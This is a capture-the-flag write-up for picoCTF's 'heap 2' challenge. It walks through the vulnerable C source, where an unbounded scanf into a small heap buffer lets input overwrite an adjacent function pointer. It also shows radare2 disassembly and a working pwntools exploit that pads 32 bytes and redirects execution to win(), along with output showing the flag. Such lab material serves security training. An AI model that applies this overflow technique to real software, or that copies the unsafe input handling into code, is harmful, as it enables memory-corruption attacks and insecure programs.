# heap 2

---

Description

Can you handle function pointers?

Download the binary here.

Download the source here.

Additional details will be available after launching your challenge instance.

---


First Some basic file check:

---

```bash
❯ rabin2 -I chall
arch     x86
baddr    0x400000
binsz    17916
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0 Ubuntu clang version 14.0.0-1ubuntu1.1
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

---

let's run the binary:

before running make sure to give executable permission to the binary:

```bash
chmod +x chall
```



```bash
❯ ./chall

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x210f6b0  ->   pico
+-------------+-----------+
[*]   0x210f6d0  ->   bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 2
Data for buffer: flag

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x210f6b0  ->   flag
+-------------+-----------+
[*]   0x210f6d0  ->   bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit
```

---

it's time for the source code:

---

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}

```

---

Analyze the binary in radare2:

```bash
❯ r2 -d -A chall
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Integrate dwarf function information.
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7f19802ab4d0]> afl
0x004010b0    1 38           entry0
0x004010f0    4 33   -> 31   sym.deregister_tm_clones
0x00401120    4 49           sym.register_tm_clones
0x00401160    3 33   -> 32   sym.__do_global_dtors_aux
0x00401190    1 6            entry.init0
0x00401280    1 46           sym.write_buffer
0x00401040    1 6            sym.imp.printf
0x00401070    1 6            sym.imp.fflush
0x00401090    1 6            sym.imp.__isoc99_scanf
0x004014ac    1 13           sym._fini
0x004011f0    1 17           sym.check_win
0x00401230    1 79           sym.init
0x00401030    1 6            sym.imp.puts
0x00401060    1 6            sym.imp.malloc
0x00401210    1 27           sym.print_menu
0x004011a0    1 80           sym.win
0x00401080    1 6            sym.imp.fopen
0x00401050    1 6            sym.imp.fgets
0x004010a0    1 6            sym.imp.exit
0x004010e0    1 5            sym._dl_relocate_static_pie
0x00401310   13 412          main
0x004012b0    1 89           sym.print_heap
0x00401000    3 27           sym._init
[0x7f19802ab4d0]> pdf @sym.win
┌ 80: sym.win ();
│           0x004011a0      53             push rbx
│           0x004011a1      4883ec40       sub rsp, 0x40
│           0x004011a5      bf30204000     mov edi, str.flag.txt       ; 0x402030 ; "flag.txt"
│           0x004011aa      be39204000     mov esi, 0x402039           ; '9 @' ; "r"
│           0x004011af      e8ccfeffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x004011b4      4889e3         mov rbx, rsp
│           0x004011b7      4889df         mov rdi, rbx
│           0x004011ba      be40000000     mov esi, 0x40               ; elf_phdr
│           0x004011bf      4889c2         mov rdx, rax
│           0x004011c2      e889feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x004011c7      4889df         mov rdi, rbx
│           0x004011ca      e861feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011cf      488b3d922e00.  mov rdi, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404068:8]=0
│           0x004011d6      e895feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x004011db      31ff           xor edi, edi
│           0x004011dd      e8befeffff     call sym.imp.exit
│           0x004011e2      662e0f1f8400.  nop word cs:[rax + rax]
└           0x004011ec      0f1f4000       nop dword [rax]
[0x7f19802ab4d0]> 

```

we can see there's a win function that never executed we need to write the buffer to the win function:

address of the win function: 0x004011a0


before inserting the win function address we need to give 32 characters:

so keep that in mind:

now we can craft our payload:

---
```python3
from pwn import *

context.binary = binary = "./chall"

win = 0x004011a0

padding = b'A' * 32
payload = padding + p64(win)

# p = process()
p = remote("mimas.picoctf.net", 58585)
p.sendlineafter(b'your choice: ',b'2')
p.sendlineafter(b'buffer: ',payload)
p.sendlineafter(b'your choice: ',b'4')
p.interactive()

```

---

let's run it:


---
```bash
❯ python3 exploit.py
[*] '/home/lynk/picoCTF/heap2/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to mimas.picoctf.net on port 56258: Done
[*] Switching to interactive mode
picoCTF{and_down_the_road_we_go_dde41590}
[*] Got EOF while reading in interactive
$
```

---

